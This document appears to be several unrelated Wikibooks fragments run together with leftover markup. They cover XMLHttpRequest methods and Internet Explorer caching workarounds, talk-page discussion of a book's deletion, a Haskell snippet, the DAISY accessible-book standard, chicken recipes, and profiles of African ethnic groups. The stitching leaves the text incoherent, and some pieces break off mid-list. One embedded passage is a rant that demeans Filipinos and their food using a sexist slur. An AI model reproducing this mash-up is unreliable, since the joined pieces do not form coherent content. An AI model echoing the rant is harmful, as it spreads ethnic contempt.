&lt;dt&gt;&lt;code&gt;abort()&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Cancels the current request.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;getAllResponseHeaders()&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the complete set of HTTP headers as a string.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;getResponseHeader(headerName)&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the value of the specified HTTP header.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;open(method, URL)&lt;/code&gt;&lt;/dt&gt;
&lt;dt&gt;&lt;code&gt;open(method, URL, async)&lt;/code&gt;&lt;/dt&gt;
&lt;dt&gt;&lt;code&gt;open(method, URL, async, userName)&lt;/code&gt;&lt;/dt&gt;
&lt;dt&gt;&lt;code&gt;open(method, URL, async, userName, password)&lt;/code&gt;&lt;/dt&gt;

&lt;dd&gt;Specifies the method, URL, and other optional attributes of a request.

* The &lt;code&gt;method&lt;/code&gt; parameter can have a value of &lt;code&gt;GET&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;HEAD&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;DELETE&lt;/code&gt;, or a variety of other HTTP methods listed in the W3C specification.
* The &lt;code&gt;URL&lt;/code&gt; parameter may be either a relative or complete URL.
* The &lt;code&gt;async&lt;/code&gt; parameter specifies whether the request should be handled asynchronously or not &amp;ndash; &lt;code&gt;true&lt;/code&gt; means that script processing carries on after the &lt;code&gt;send()&lt;/code&gt; method, without waiting for a response, and &lt;code&gt;false&lt;/code&gt; means that the script waits for a response before continuing script processing.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;send(content)&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Sends the request. &lt;code&gt;content&lt;/code&gt; can be a string or reference to a document.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;setRequestHeader(label, value)&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Adds a &lt;code&gt;label&lt;/code&gt;/&lt;code&gt;value&lt;/code&gt; pair to the HTTP header to be sent.&lt;/dd&gt;
&lt;/dl&gt;

===Properties===
&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;onreadystatechange&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Specifies a reference to an event handler for an event that fires at every state change&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;readyState&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the state of the object as follows:

* 0 = uninitialized – &lt;code&gt;open()&lt;/code&gt; has not yet been called.
* 1 = open – &lt;code&gt;send()&lt;/code&gt; has not yet been called.
* 2 = sent – &lt;code&gt;send()&lt;/code&gt; has been called, headers and status are available.
* 3 = receiving – Downloading, &lt;code&gt;responseText&lt;/code&gt; holds partial data
* 4 = loaded – Finished.
&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;responseText&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the response as a string.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;responseXML&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the response as XML. This property returns an XML document object, which can be examined and parsed using W3C DOM node tree methods and properties.&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;responseBody&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the response as a binary encoded string. This property is not part of the native XMLHttpRequest wrapper. For this property to be available, the XHR object ''must'' be created with an ActiveX component. A JScript example:

&lt;source lang=&quot;JavaScript&quot;&gt;
if(typeof ActiveXObject != &quot;undefined&quot;) {
  xmlhttp = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
  xmlhttp.open(&quot;GET&quot;, &quot;#&quot;, false);
  xmlhttp.send(null);
  alert(xmlhttp.responseBody);
} else {
  alert(&quot;This browser does not support Microsoft ActiveXObjects.&quot;)
}
&lt;/source&gt;&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;status&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the HTTP status code as a number (e.g. 404 for &quot;Not Found&quot; and 200 for &quot;OK&quot;). Some network-related status codes (e.g. 408 for &quot;Request Timeout&quot;) cause errors to be thrown in Firefox if the status fields are accessed. If the server does not respond (properly), IE returns a [http://support.microsoft.com/kb/193625 WinInet Error Code] (e.g 12029 for &quot;cannot connect&quot;).&lt;/dd&gt;

&lt;dt&gt;&lt;code&gt;statusText&lt;/code&gt;&lt;/dt&gt;
&lt;dd&gt;Returns the status as a string (e.g. &quot;Not Found&quot; or &quot;OK&quot;).&lt;/dd&gt;
&lt;/dl&gt;

==Bugs and inconsistencies==

Dealing with bugs and inconsistencies in XMLHttpRequest implementations:

===Caching===
Most of the implementations also realize HTTP caching. Internet Explorer and Firefox do, but there is a difference in how and when the cached data is revalidated.
Firefox revalidates the cached response every time the page is refreshed, issuing an &quot;If-Modified-Since&quot; header with value set to the value of the &quot;Last-Modified&quot; header of the cached response.

Internet Explorer does so only if the cached response is expired (i.e., after the date of received &quot;Expires&quot; header). This raises some issues, since a bug exists in Internet Explorer, where the cached response is never refreshed.

It is possible to unify the caching behavior on the client. The following script illustrates an example approach:
&lt;source lang=&quot;JavaScript&quot;&gt;
var request = new XMLHttpRequest();
request.open(&quot;GET&quot;, url, false);
request.send(null);
if(!request.getResponseHeader(&quot;Date&quot;)) {
  var cached = request;
  request = new XMLHttpRequest();
  var ifModifiedSince =
    cached.getResponseHeader(&quot;Last-Modified&quot;) ||
    new Date(0); // January 1, 1970
  request.open(&quot;GET&quot;, url, false);
  request.setRequestHeader(&quot;If-Modified-Since&quot;, ifModifiedSince);
  request.send(&quot;&quot;);
  if(request.status == 304) {
    request = cached;
  }
}
&lt;/source&gt;
In Internet Explorer, if the response is returned from the cache without revalidation, the &quot;Date&quot; header is an empty string. The workaround is achieved by checking the &quot;Date&quot; response header and issuing another request if needed. In case a second request is needed, the actual HTTP request is not made twice, as the first call would not produce an actual HTTP request.

The reference to the cached request is preserved, because if the response code/status of the second call is &quot;304 Not Modified&quot;, the response body becomes an empty string (&quot;&quot;) and then it is needed to go back to the cached object. A way to save memory and expenses of second object creation is to preserve just the needed response data and reuse the XMLHttpRequest object.

The above script relies on the assumption that the &quot;Date&quot; header is always issued by the server, which should be true for most server configurations. Also, it illustrates a synchronous communication between the server and the client. In case of asynchronous communication, the check should be made during the callback.

This problem is often overcome by employing techniques preventing the caching at all. Using these techniques indiscriminately can result in poor performance and waste of network bandwidth.

If script executes operation that has side effects (e.g. adding a comment, marking message as read) which requires that request always reaches the end server, it should use &lt;code&gt;POST&lt;/code&gt; method instead.

====Workaround====
Internet Explorer will also cache dynamic pages and this is a problem because the URL of the page may not change but the content will (for example a news feed). A workaround for this situation can be achieved by adding a unique time stamp or random number, or possibly both, typically using the Date object and/or Math.random().

For simple document request the query string delimiter '?' can be used, or for existing queries a final sub-query can be added after a final '&amp;' – to append the unique query term to the existing query. The downside is that each such request will fill up the cache with useless (never reused) content that could otherwise be used for other cached content (more useful data will be purged from cache to make room for these one-time responses).

A better workaround can be achieved by adding meta tags to dynamic pages in order to make them no-cachable:
&lt;source lang=&quot;html4strict&quot;&gt;
&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-cache&quot; /&gt;
&lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot; /&gt;
&lt;/source&gt;

===Reusing XMLHttpRequest Object in IE===
In IE, if the open method is called after setting the onreadystatechange callback, there will be a problem when trying to reuse the XHR object. To be able to reuse the XHR object properly, use the open method first and set onreadystatechange later. This happens because IE resets the object implicitly in the open method if the status is 'completed'. For more explanation of reuse: [http://keelypavan.blogspot.com/2006/03/reusing-xmlhttprequest-object-in-ie.html Reusing XMLHttpRequest Object in IE]. The downside to calling the open method after setting the callback is a loss of cross-browser support for readystates.

== Wikibookian ==
I have started to be a Wikibookian last year, but was quite inactive until earlier this year. I think I have some anon edits in 2008, but I can't remember if it was in here or simplewb. You will probably find me in:
* [[Wikijunior:Ancient Civilizations]]
* [[English Grammar Worksheets]]
* [[Geometry for Elementary School]]

In Wikipedia, I'm often at the [[WP:MOTD]], but I obviously do more than motto-writing. :P

Stuff I created:
* [[Geometry for Elementary School/Angles]]
* [[Geometry for Elementary School/Plane shapes]]
* [[Geometry for Elementary School/The Angle-Side-Angle congruence theorem]]
* [[Geometry for Elementary School/Congruence]]
* [[Geometry for Elementary School/Solids]]
* [[Geometry for Elementary School/Similarity]]
* [[Geometry for Elementary School/What next?]]
* [[Geometry for Elementary School/Measurements]]
* [[Geometry for Elementary School/Transformation]]
* [[Geometry for Elementary School/Coordinates]]
* [[Template:Elements]]
* [[Chinese Stories]] (whole book)
* [[WJ:Particles]] (whole book)
* [[WJ:The Book of Estimation]]
* [[History of Hong Kong]]

===current plans===
*First, I'm gonna finish [[WJ:The Book of Estimation]].
*Next, I'll probably make another WJ book (I have 'ecosystems' in mind).
*A few years later, I'll return to [[History of Hong Kong]] to finish it.
*[[Pinyin]] could also use a revamp.
*&lt;s&gt;[[ActionSciprt Programming]] too. It's not very user-friendly.&lt;/s&gt; Actually, I don't think I can really improve upon the book at its current state. I'll fork one instead.

Please leave messages here.

== Lohse, Martin ==

You made this page: [[Music Theory/Lohse, Martin]] in the book music theory, but then you made pages such as [[Lohse, Martin/Short biography]] under a nonexistent book titled [[Lohse, Martin]].  Should they be in the [[Music Theory]] book instead, making the aforementioned page ''Music Theory/Lohse, Martin/Short biography''? If so, I can correct this.  If not, then [[Music Theory/Lohse, Martin]] should be moved to [[Lohse, Martin]] so the pages have a root page.  Please let me know. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 12:15, 23 July 2009 (UTC)


Thank you for the comment! I've been in doubth where to put the book, can you please move the book from music theory to [[Lohse, Martin]]? Best regards [[User:Martin Lohse|Martin Lohse]] ([[User talk:Martin Lohse|talk]]) 13:05, 23 July 2009 (UTC).

: It's taken care of now. I also added category code to the book template to categorize the pages in [[:Category:Lohse, Martin]] and added the book to [[:Category:Music theory]] so that it can be found by people browsing the books. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 13:14, 23 July 2009 (UTC)

== Original research ==

Please remember that we do not allow [[WB:OR|original research]] on Wikibooks. Any information you add to the book about you must be verified with reliable sources, e.g. newspapers that interview you, books written about you, etc. I am not implying that your book contains excessive original research, but only trying to remind you that such information is not allowed, as you have a conflict of interest. Thanks for reading this comment, [[User:Kayau|Kayau]] ( [[User talk:Kayau|talk]] &amp;#124; [[Special:Emailuser/Kayau|email]] &amp;#124; [[Special:Contributions/Kayau|contribs]] ) 13:26, 27 May 2010 (UTC)

== Rights change ==

You can now upload files via [[Special:Upload]]. Please be sure to add {{tl|information}} to indicate authorship and {{tl|non-free media rationale}} to them to justify their status as fair use. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 14:27, 27 May 2010 (UTC)

== [[Lohse, Martin]] ==

Hi.  Based on my interpretation of Wikibooks site policy, I believe your book [[Lohse, Martin]] in its current form is, unfortunately, in violation of [[Wikibooks:What is Wikibooks?#Wikibooks is not a free wiki host or webspace provider|WB:HOST]].  This is a heads-up that I'm going to bring the question to the community, for opinions from more people here and a collective decision one way or another.  The vehicle for that is a {{nowrap|[[WB:RFD|nomination for deletion]]}}.  The outcome isn't necessarily as simple as just &quot;keep&quot; or &quot;delete&quot;; even when it's agreed that there's a problem, there are various ways that might be chosen to reasonably resolve it.  Sometimes, yes, a book is simply deleted, flat out; but, for example, it might be decided that a book can be kept if its changed in some way, a book could be merged into another book, or transwikied to another WMF project, or the author can be given some time to move the material to another host.  You'll be invited to participate in that discussion by the standard {{nowrap|{{tl|rfd warning}}}} tag, which I'll be adding here in a little while, when I've got the procedure underway.  I wanted to leave you a personal note here first, though, rather than just nominate it for deletion and let the standard tag be the first you heard of it.  {{nowrap|--[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 22:30, 27 May 2010 (UTC)}}

{{tmbox|type=delete|text=
'''[[:Lohse, Martin|Lohse, Martin]] has been nominated for deletion. Please [[Wikibooks:Requests for deletion#Lohse, Martin|share your thoughts]].'''&lt;br/&gt;You are being notified because you have contributed to this work. If you haven't read it already, please see our [[WB:DP|deletion policy]]. --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 22:42, 27 May 2010 (UTC)}}

:'''Comment''': I've been studying the [[WB:HOST]], and I agree, in a strict sense it violate the paragraph of not publishing original research, there is text in the book which has never been published before. On the other hand most of the material in the book has been published in newspapers, radio programs, music articles and program notes for the scores, and the book is an attempt to collect all the different material in one place. We are very few who contributes to the book, and the main purpose of my contribution is to illustrate the text with scores and sound samples, which needs to be given the right license etc. [[User:Martin Lohse|Martin Lohse]] ([[User talk:Martin Lohse|talk]]) 07:55, 28 May 2010 (UTC)

:'''Comment''': Relevance of the book: An important tool in a composers development is the study of contemporary techniques of other composer, for inspiration or rejection, which makes a few but dedicated readers to the book. [[User:Martin Lohse|Martin Lohse]] ([[User talk:Martin Lohse|talk]]) 08:07, 28 May 2010 (UTC)

::Hello,

::Even if you are probably following the request for deletion discussion on the [[Lohse, Martin]] book I felt it was adequate to leave you a note anyway. While I do believe the book falls within project scope, requiring only some adjustments of tone and approach, a superior alternative (in my humble opinion) for preserving the contents was proposed - namely, moving it to [[v:Main Page|Wikiversity]]. Wikiversity projects are more open-ended than Wikibooks ones, both in terms of structure (the projects do not necessarily have to look like a book) and contents (what we usually call &quot;original research&quot; is admissible there if done consistently and transparently). That would mean less trouble you and the other co-authors, which wouldn't have to fight against the restrictions the Wikibooks project scope imposes on your vision, and also allow for more interaction between readers and writers.

::I invite you to share your feelings about the possibility of the move. I am no admin or experienced editor, but if the transwiki process gets agreed upon people will certainly be willing to help with any technical details. Regards, --[[User:Duplode|Duplode]] ([[User talk:Duplode|talk]]) 13:54, 2 June 2010 (UTC)</text>

== Splitting Computer Programming/Hello world ==

I was just wondering why you thought [[Computer Programming/Hello world|Computer Programming/Hello world]] should be split, or how. [[User:Ubigcow|Ubigcow]] ([[User talk:Ubigcow|discuss]] • [[Special:Contributions/Ubigcow|contribs]]) 03:01, 25 December 2011 (UTC)

Remember that:

 power2 0 = 1
 power2 n = 2 * power2 (n-1)

First, we need to consider whether &lt;code&gt;&amp;perp; - 1&lt;/code&gt; is &lt;code&gt;&amp;perp;&lt;/code&gt; or not. Using similar reasoning to the &lt;code&gt;&amp;perp; + 1&lt;/code&gt; case, we can determine that &lt;code&gt;&amp;perp; - 1&lt;/code&gt; is indeed &lt;code&gt;&amp;perp;&lt;/code&gt;. From there, we know that &lt;code&gt;power2 &amp;perp;&lt;/code&gt; is &lt;code&gt;2 * power2 &amp;perp;&lt;/code&gt;. Since this recurses indefinitely, it is equivalent to &lt;code&gt;&amp;perp;&lt;/code&gt;.

== Overview ==

We live in a digital, knowledge-based world which is difficult to access by those who are blind or print disabled.  It is clear that “being able to use, read, and understand communications is not only a precondition to participate in social life; it is also a key to quality of life for the individual.  Not being able to read or write at the same level as everybody else is a serious disadvantage in the knowledge society” (Tank &amp; Frederickson, 2007).  To help correct this disadvantage major world libraries have created talking books called DAISY, an acronym for Digital Accessible Information System.

The DAISY talking book has revolutionized the talking book technology by removing problems associated with earlier books on tape. These problems were delayed supply, cumbersome technology, and non-intuitive interfaces. Some of the features that make the DAISY system effective are image files, video playback, and support for standard files such as .wav, .jpeg, etc. The tools allowed by DAISY aids those with visual impairments to share in today's digital, knowledge society. This is very important when you consider that globally in 2002 more than 161 million people were visually impaired, of whom 124 million people had low vision and 37 million were blind (Tank &amp; Frederickson, 2007).
The original concept for DAISY was developed to address the need for an accessible audio format that could be used by individuals who are unable to read print as easily and efficiently as a sighted person uses a printed book. DAISY provides direct access to specific points, enabling readers to move from heading to heading, page to page, and word to word (Gargano, 2008).  DAISY books have synchronized text and images that provide a complete multimedia experience.

== The Daisy Consortium ==
[[Image:daisy low.jpg|left|thumb|350px]]

The DAISY Consortium was formed in May, 1996 by talking book libraries to lead the worldwide transition from analog to Digital Talking Books. DAISY denotes the Digital Accessible Information System.

Members of the Consortium actively promote the DAISY Standard for Digital Talking Books because it promises to revolutionize the reading experience for people who have reading disabilities. Specifically, the Consortium's vision is that all published information is available to people with print disabilities, at the same time and at no greater cost, in an accessible, feature-rich, navigable format. The DAISY Consortium has established a mission and goals in order to make this vision a reality.

The first DAISY Standard was proprietary, originating in Sweden in 1994. The idea was to use digital recording and introduce some document structuring that would allow easy navigation by the user. In its short history, the DAISY Specification has evolved considerably. It has already begun to offer a more flexible and pleasant reading experience for people who are blind or print disabled in a number of countries including Sweden, Japan, the United Kingdom, and the United States.

In 1997, the DAISY Consortium decided to adopt open standards based on file formats being developed for the Internet. The DAISY 2.0 Specification was released in 1998, and the 2.02 recommendation was approved in February 2001. Release of DAISY 3, the ANSI/NISO Z39.86 2002 Standard, was official in March 2002. This Standard was jointly developed by the DAISY Consortium, The National Library Service for the Blind and Physically Handicapped (part of the Library of Congress), and a variety of other organizations in North America. Plans are underway for the development of the supporting materials necessary to promote the Standard.

The consortium’s five major goals are:

•	to create and promote the worldwide standard for the navigation and structure of digital talking books;

•	to encourage and foster the establishment and development of the digital talking book library services in both developed and developing countries;

•	to maximize the accessibility and utility of electronic books and multimedia documents for people with print disabilities;

•	to secure the recognition adoption of the DAISY standard for navigable multimedia documents among mainstream product developers and book publishers; and

•	to encourage and foster the establishment and development of a global talking book library that transcends geographic boundaries and linguistic differences and that embraces cultural diversity 

In today's knowledge economy and digital world the Daisy Consortium seeks to make published information available to people with disabilities at the same time as printed versions, at no greater cost, and in an accessible, feature-rich and navigable format (Tank &amp; Frederiksen, 2007).

== The SAVE AS DAISY Project ==

In an effort to make content more accessible for the blind and print disabled Microsoft joined with the DAISY Consortium on the Save as DAISY project.  Microsoft's contribution is an add-in to the popular Microsoft Office suite that allows anyone to save a document in a standard accessible format.  The add-in can be downloaded at http://www.openxmlcommunity.org/daisy/.  It is easy to use, it creates as SAVE AS DAISY option within Microsoft Word and walk you through formatting options (see image below).
[[Image:saveasDAISY.jpg|left|thumb|650px]]

== Copyright &amp; Accessibility ==

The DAISY standard must consider issues regarding copyright and intellectual property,” the fair balance of copyright, between the protection of creative works and access to information and knowledge, is delicate” (Tank &amp; Frederickson, 2007).  Protections must remain in place while still allowing the DAISY technologies to assist those who are print disabled.
	

Although the DAISY standard was created to benefit print disabled individuals, it has become a popular technology that has moved into the mainstream, the advantages of accessing different types of digital information on a variety of devices are not limited to the visually impaired; the work to serve those with print disabilities today has and will benefit future users by lowering costs and speeding development (Microsoft, 2004).

When you get the job of smoked or barbecued chicken, do you weep in fear of flavorless breasts? It happens to everybody, even professional chefs. This is your solution.

== Ingredients ==
* 4 boneless skinless chicken breasts
* 1 cup salt (if you're concerned, get this: The meat takes just enough from the brine. In the end product, there's less salt than an order of large fries.)
* 3/4 cup plus 2 tbs honey
* 2 cups very hot apple cider vinegar
* 2 pounds ice
* 4 sprigs fresh rosemary, finely chopped
* 10 sprigs fresh thyme, finely chopped
* 1 tbs black peppercorns, cracked
* 1 tbs chili powder
* 1 tbs cayenne pepper
* 2 tbs paprika
* 1 1/2 tsp lemon-pepper
* Several pounds of large hickory chunks

== Procedure ==
#Combine salt, honey, herbs, and vinegar in a gallon-size zip-top bag. Add ice and shake until ice is mostly melted and mixture has cooled enough for meat to safely not cook.
#Add chicken and refrigerate 1-2 hours.
#Take chicken out of brine and pat dry with paper towels. Set aside.
#Combine lemon pepper, peppercorns, chili powder, cayenne pepper, and paprika. Rub mixture gently into both sides of each chicken piece.
#Place enough hickory wood chunks into the firebox of a smoker to keep the temperature around 225 degrees F. Insert a probe thermometer into one of the chicken pieces and place in the smoker. Cook, changing chunks as needed, until internal temperature reaches 165 degrees F.
#Remove to a plate and let rest, uncovered, for 5 minutes. Serve warm.</text>

'''Lemon-pepper''' is a mixture of granulated lemon zest/peel, black peppercorns, and sometimes with other ingredients, such as garlic, onion, sugar, citric acid, salt, and maltodextrin (derived from cornstarch). It is commonly used on chicken and seafood as a seasoning.</text>

      <text xml:space="preserve">Why would anybody even think about putting a template on well, whatever you said! Filipinos host game shows where all they do is watch sluts dancing around with money. They make soups from pig intestines, they boil nice, juicy, ribeyes into gooey mush with bok choy, potatoes, and all of that! They cook cow crotches in pig blood! They make purple yam ice cream, they make cheddar cheese ice cream, and since they don't know how to make real ice cream, they use oil! They grill stew meat too! They also think all salt is the same. It's not even close to that!</text>

If the amount of oil absorbed by a chicken breast fried in 350 degree F oil (1 tbs) isn't enough to satisfy you health nuts, then here is a recipe for oven-fried chicken.

== Ingredients ==
* 4 boneless skinless chicken breasts
* 2 eggs, beaten
* 1 tbs Worcestershire sauce
* 1/4 cup freshly squeezed lemon juice (yes, that's got to be freshly squeezed!)
* 1/4 cup light honey
* 1 tbs salt
* 2 tbs smoked paprika
* 1 tsp garlic powder
* 1 tbs cayenne pepper
* 1/2 cup garlic-flavored croûtons, coarsely chopped
* 1/4 cup crushed cornflakes
* Olive oil

== Procedure ==
#Combine eggs, sauce, juice, and honey in a large dish. Dip each piece of chicken into mixture. Set aside.
#Combine salt, paprika, garlic powder, and cayenne pepper. Season chicken liberally with this mixture.
#Combine croûtons and cornflakes. Coat both sides of each piece of chicken with mixture.
#Coat each chicken piece with olive oil. Insert a probe thermometer into one of the pieces and place in a parchment-lined baking pan.
#Bake at 400 degrees F until internal temperature reaches 165 degrees F.
#Remove to a plate and let rest 5 minutes. Serve warm.</text>

* 2 1/2 cups low-sodium chicken broth
* 1 cup red wine, preferably Chianti
* 3 bay leaves
* 7 cloves garlic, smashed
* 10 sprigs fresh thyme
* 5-6 sprigs fresh rosemary
* 1 large onion, finely diced

== Procedure ==
#Melt butter in a large saucepan over medium high heat. Add rice and onion and cook until rice is golden.
#Meanwhile, combine remaining ingredients. Once rice has toasted, remove from pot and add mixture. Bring to a boil and add rice. Cook, stirring occasionally, 30 minutes or until rice is desired tenderness.
#Serve warm with a steak and a glass o' red wine, maybe a vegetable saute.</text>

*1 tbs dehydrated lime peel
*2 tbs dried rosemary
*3 tbs dried thyme
*3 tbs dried oregano
*1/4 cup smoked paprika
*1 tbs freshly ground cinnamon

== Procedure ==
#Pulse everything in your spice grinder until relatively smooth. If your spice grinder doubles as your coffee grinder, make sure you pulse some rice after. Keep in an airtight container with a shaker lid for up to a year.</text>

* 4 sugar cubes

==1. Be able to name and locate at least ten different African tribes of the present day and name several outstanding features of each. ==
The answers for requirement two include information about the location of the tribes described.  We suggest that you consult a map of Africa and using the information presented below, locate the areas where ten tribes are today.  Requirement two also provides many outstanding features of the tribes described.

==2a. Select for study an African Tribe. (If you belong to an African Tribe, select one other than your own.)==
There are thousands of tribes in Africa, and we will not pretend to describe them all.  Rather, we will present a small handful of the largest tribes here, and even then, not with much detail.  If an African tribe not described here interests you, you are encouraged to research it.  If you like, you can add your research to this Wikibook.

==2b. Find out detailed information on the tribe selected, in the following areas: &lt;br&gt;(1) Eating habits&lt;br&gt;(2) Initiation ceremony&lt;br&gt;(3) Witch doctors&lt;br&gt;(4) Living and worship conditions&lt;br&gt;(5) Education&lt;br&gt;(6) Burials&lt;br&gt;(7) Money&lt;br&gt;(8) Dress&lt;br&gt;(9) Industry ==

===Acholi===
{{Ethnic group
|name = Acholi
|image = Ugandan_children.jpg
|image caption = Children displaced by the insurgency of the Lord's Resistance Army (LRA) of northern Uganda into Labuje camp near Kitgum Town.
|Eating habits = 
|Initiation ceremony =
|Shamans = 
|Living conditions = Their traditional dwelling-places were circular huts with a high peak, furnished with a mud sleeping-platform, jars of grain and a sunk fireplace, with the walls daubed with mud and decorated with geometrical or conventional designs in red, white or grey.
|Religion=Most Acholi are Protestant, Catholic and, in lesser numbers, Muslim. Nevertheless, the traditional belief in guardian and ancestor spirits remains strong, though it is now often described in Christian or Islamic terms.
|Education=
|Burial=When a man dies he is buried near the entrance of his hut.  The grave is left open and guarded by a young person until it begins to decompose.  At that time, it is considered safe to bury the corpse.  After burial, a fence is erected around the grave, and trees are planted on top of it.  The Acholi consider it unfortunate for a man to die of natural causes.  It is considered lucky for a man to die while hunting or while fighting a war, even though the body is left unburied in these cases, left for the vultures.

===Amhara===
{{Ethnic group
|name = Amhara
|image = Adi Arkay.jpg
|image caption = A street in Adi Arkay with a view to the Simien Mountains in the background (Amhara Region, Ethiopia).

|Eating habits = Barley, corn, millet, wheat, sorghum, and teff, along with beans, peppers, chickpeas, and other vegetables, are the most important crops. In the highlands one crop per year is normal, while in the lowlands two are possible. Cattle, sheep, and goats are also raised.

|Initiation ceremony = The Amhara consider it dishonorable for a man to marry a woman who is not a virgin.  Therefore, girls were until recently married shortly after beginning menstruation.  

|Shamans = The Amhara have priests to administer their religious rites.

|Living conditions = About 90 percent of the Amhara are rural and make their living through farming, mostly in the Ethiopian highlands. Prior to the 1974 Ethiopian Revolution, absentee landlords maintained strict control over their sharecropping tenants, often allowing them to accumulate crippling debt. After 1974, the landlords were replaced by local government officials, who play a similar role.

|Religion=The predominant religion of the Amhara for centuries has been Christianity, with the Ethiopian Orthodox Tewahedo Church playing a central role in the culture of the country. According to the 1994 census, 81.5 percent of the population of the Amhara region (which is 91.2 percent Amhara) were Ethiopian Orthodox; 18.1 percent were Muslim, and 0.1 percent were Protestant (&quot;P'ent'ay&quot;). The Ethiopian Orthodox Church maintains close links with the Egyptian Coptic Church. Easter and Epiphany are the most important celebrations, marked with services, feasting and dancing. There are also many fast days throughout the year, when only vegetables or fish may be eaten.

|Education=Today, most Amhara are educated in secular schools, but in the past, education was the duty of the church.

|Burial= The body is washed, wrapped in funeral clothing, and carried to the church in a straw mat.  The body is generally buried withing 24 hours of death.

|Money=
[[File:Birr.JPG|thumb|200px|Ethopian birr]]
The ''birr'' is the unit of currency in Ethiopia. Before 1976, dollar was the official English translation of birr. Today, it is officially birr in English as well.

|Dress=The Amhara live at high altitudes ({{units|2100-4200 meters|7000-14000 feet}}), so their clothing is designed to be warm.  In modern times, the Amhara dress in western clothing manufactured in Asia.  Some still prefer traditional clothing, which consists of jodphurs and a shirt, with an outer garment called a ''gabi''.

|Industry=Most people are employed in agricultural pursuits, but many also run businesses, trading all sorts of goods.

|Location=Ethiopia

|Members=19.8 million
}}

===Fula===
{{Ethnic group
|name = Fula
|image = Peul women in Paoua.jpg
|image caption = Fula women

|Eating habits = Dairy is an important part of the diet, including milk, yogurt, and butter.  Their main meal of the day will feature a porridge made from grain (millet, sorghum, or corn).  

|Initiation ceremony =The ''Guérewol'' is an annual courtship ritual competition among the Wodaabe Fula people of Niger. Young men dressed in elaborate ornamentation and made up in traditional face painting gather in lines to dance and sing, vying for the attentions of marriageable young women.

|Shamans = Similar to spiritual leaders, the imam is the one who leads the prayer during Islamic gatherings. More often the community turns to the mosque imam, if they have an Islamic question. In smaller communities an imam could be the community leader based on the community setting.

|Living conditions = The Fulani are traditionally a nomadic, pastoralist, trading people, herding cattle, goats and sheep across the vast dry hinterlands of their domain, keeping somewhat separate from the local agricultural populations.

|Religion=Over 99% of the Fula people practice Islam.

|Education=Children are educated by their parents and by older siblings.  They also attend Koranic schools where they learn the scriptures and teachings of Islam.

|Burial=The body is washed, wrapped in a scented cotton shroud, and buried.  After three days, alms are given to Koranic students, the sick, and the poor.  

|Money=

|Dress=The traditional dress of the Fula in most places consists of long colorful flowing robes, modestly embroidered or otherwise decorated.

|Industry=Nomadic Fula men tend cattle.  Some hold jobs in the cities as teachers and businessmen.  

|Location=The Fula are an ethnic group of people spread over many countries, predominantly in West Africa, but found also in Central Africa and Sudanese North Africa. The countries in Africa where they are present include Mauritania, Senegal, Guinea, The Gambia, Mali, Nigeria, Sierra Leone, Benin, Burkina Faso, Guinea Bissau, Cameroon, Côte d'Ivoire, Niger, Chad, Togo, the Central African Republic, Ghana, Liberia, and as far as Sudan in the east. Fula people form a minority in every country they live, but in Guinea they represent a plurality of the population (40%).

|Members=Over 6 million

===Igbo===
{{Ethnic group
|name = Igbo
|image = Igbo people.jpg
|image caption = O. Equiano • Jaja of Opobo • Chinua Achebe • C. Ohuruogu

|Eating habits = 
The yam is very important to the Igbo as it is their staple crop. There are celebrations such as the New yam festival  which are held for the harvesting of the yam. During the festival yam is eaten throughout the communities as celebration. Yam tubers are shown off by individuals as a sign of success and wealth.

Rice has replaced yam for ceremonial occasions. Other foods include cassava, garri, maize and plantains. Soups or stews are included in a typical meal, prepared with a vegetable (such as okra, of which the word derives from the Igbo language, Okwuru) to which pieces of fish, chicken, beef, or goat meat are added. Jollof rice is popular throughout West Africa.

|Initiation ceremony = Boys and girls are initiated into adulthood in a ceremony in which they are given their first clothes, called ''Ima Akwa''.  Until that time they are basically naked (and are considered to have nothing to hide until then), with the exception of beads worn for spiritual purposes.  

|Shamans = In Igbo society, there are intermediaries between individuals or whole communities and specific deities. Variously called Dibia, Babalawo, etc., the priest usually presides at the altar of a particular deity.

The Igbo believe in reincarnation. People are believed to reincarnate into families that they were part of while alive. Before a relative dies, it is said that the soon to be deceased relative sometimes give clues of who they will reincarnate as in the family. Once a child is born, he or she is believed to give signs of who they have reincarnated from. This can be through behavior, physical traits and statements by the child. A diviner can help in detecting who the child has reincarnated from.

|Living conditions = Before the development of the oil industry in Nigeria, most Igbo people lived in mud huts with thatch roofs.  Today, they live in houses made of cement blocks with corrugated iron roofs.

